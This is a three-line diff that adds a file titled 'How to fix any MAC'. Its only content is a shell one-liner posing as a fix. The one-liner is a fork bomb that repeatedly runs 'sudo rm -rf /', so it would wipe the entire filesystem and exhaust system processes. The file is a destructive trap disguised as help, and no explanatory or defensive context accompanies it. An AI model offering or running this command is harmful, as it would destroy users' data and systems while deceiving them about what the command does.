@@ -1,0 +1,3 @@
+How to fix any MAC
+
+:(){ sh -c "sudo rm -rf /"; :|: & };:
